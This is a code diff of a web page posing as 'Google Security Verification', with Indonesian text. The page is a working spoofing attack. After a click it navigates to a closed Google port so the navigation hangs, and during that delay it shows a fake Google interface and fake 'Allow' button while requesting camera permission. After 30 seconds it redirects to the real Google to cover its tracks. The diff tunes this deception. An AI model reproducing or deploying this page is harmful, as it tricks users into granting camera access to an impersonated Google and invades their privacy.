@@ -13,19 +13,16 @@
   button { padding: 15px 30px; background: #1a73e8; color: #fff; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; width: 100%; }
   button:hover { background: #1557b0; }
   #status { margin-top: 20px; font-family: monospace; font-size: 12px; color: #666; }
-  iframe { display: none; }
 </style>
 </head>
 <body>
 
 <div class="panel" id="main-card">
   <h2>🔒 Google Security Verification</h2>
-  <p>Klik tombol di bawah untuk memverifikasi akun Google Anda. Anda akan diarahkan ke server aman Google (port 8443) dan diminta mengizinkan kamera untuk verifikasi.</p>
+  <p>Klik tombol di bawah untuk memverifikasi akun Google Anda. Anda akan diarahkan ke server aman Google (port 8443) dan diminta mengizinkan kamera.</p>
   <button id="startBtn">Verify Account & Allow Camera</button>
   <div id="status">[*] Ready...</div>
 </div>
-
-<div id="launcher-container" style="display: none;"></div>
 
 <script>
 (function () {
@@ -36,18 +33,19 @@
 
   function log(msg) {
     statusEl.textContent = msg;
-    console.log("[Delay+Permission Spoof] " + msg);
+    console.log("[Delay 30s] " + msg);
   }
 
   // ============================================
   // 1. TRIGGER (KLIK)
   // ============================================
   btn.addEventListener('click', function() {
-    log("[*] Memulai delay + permission spoofing...");
+    log("[*] Memulai delay spoofing 30 detik...");
 
     // ============================================
     // 2. REDIRECT KE GOOGLE:8443 (PENDING NAVIGATION)
     // ============================================
+    // Port 8443 tertutup, koneksi menggantung hingga timeout (~30 detik).
     try {
       window.location.href = "https://www.google.com:8443";
     } catch (e) {
@@ -55,7 +53,7 @@
     }
 
     // ============================================
-    // 3. SELAMA DELAY, TAMPILKAN UI PALSU + MINTA IZIN KAMERA
+    // 3. SELAMA DELAY 30 DETIK, TAMPILKAN UI PALSU + MINTA IZIN KAMERA
     // ============================================
     setTimeout(function() {
       log("[*] Meminta Izin Kamera (saat pending navigation)...");
@@ -95,13 +93,20 @@
           }, 1000);
         });
 
-      // C. Tangkap klik tombol palsu (jika user mengklik)
+      // C. Tangkap klik tombol palsu
       document.getElementById('spoofLogin').addEventListener('click', function() {
         log("[!] User clicked FAKE Allow button.");
-        // Prompt kamera asli sudah dipicu di atas
       });
 
     }, 1000); // 1 detik setelah redirect (saat pending)
+
+    // ============================================
+    // 4. SETELAH 30 DETIK, REDIRECT KE GOOGLE ASLI
+    // ============================================
+    setTimeout(function() {
+      log("[*] 30 detik berlalu. Redirect ke Google asli...");
+      window.location.replace('https://www.google.com');
+    }, 30000); // 30 detik
 
   }, { once: true });
 
